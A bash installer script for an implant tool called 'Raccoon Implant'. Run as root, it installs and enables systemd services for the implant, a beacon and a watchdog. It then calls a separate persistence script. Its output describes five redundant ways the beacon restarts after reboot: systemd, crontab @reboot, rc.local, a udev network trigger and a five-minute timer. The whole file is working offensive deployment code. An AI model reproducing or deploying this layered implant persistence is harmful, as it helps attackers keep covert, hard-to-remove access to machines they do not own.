#!/bin/bash
# Raccoon Implant — Service installation
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Must run as root (sudo)${NC}"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

echo -e "${YELLOW}[*] Installing Raccoon Implant services${NC}"

# ── Core services ──
echo -e "${GREEN}[+] Installing systemd units${NC}"
cp "${SCRIPT_DIR}/raccoon-implant.service" /etc/systemd/system/
cp "${SCRIPT_DIR}/raccoon-beacon.service" /etc/systemd/system/
cp "${SCRIPT_DIR}/raccoon-watchdog.service" /etc/systemd/system/

systemctl daemon-reload

systemctl enable raccoon-implant.service
systemctl enable raccoon-beacon.service
systemctl enable raccoon-watchdog.service

echo -e "${GREEN}[+] Core services enabled${NC}"

# ── Beacon persistence (multi-layer) ──
echo -e "${GREEN}[+] Installing beacon persistence${NC}"
if [ -x "${PROJECT_DIR}/software/setup/persist.sh" ]; then
    bash "${PROJECT_DIR}/software/setup/persist.sh"
else
    chmod +x "${PROJECT_DIR}/software/setup/persist.sh"
    bash "${PROJECT_DIR}/software/setup/persist.sh"
fi

echo ""
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}  All services installed${NC}"
echo -e "${GREEN}============================================${NC}"
echo ""
echo -e "${YELLOW}Management:${NC}"
echo "  sudo systemctl start raccoon-implant    # full implant"
echo "  sudo systemctl start raccoon-beacon     # beacon only"
echo "  sudo systemctl status raccoon-implant"
echo "  sudo systemctl status raccoon-beacon"
echo "  sudo journalctl -u raccoon-implant -f"
echo ""
echo -e "${YELLOW}After reboot, the beacon starts automatically via:${NC}"
echo "  1. systemd raccoon-beacon.service"
echo "  2. crontab @reboot"
echo "  3. rc.local"
echo "  4. udev network trigger"
echo "  5. systemd timer watchdog (every 5 min)"
echo ""
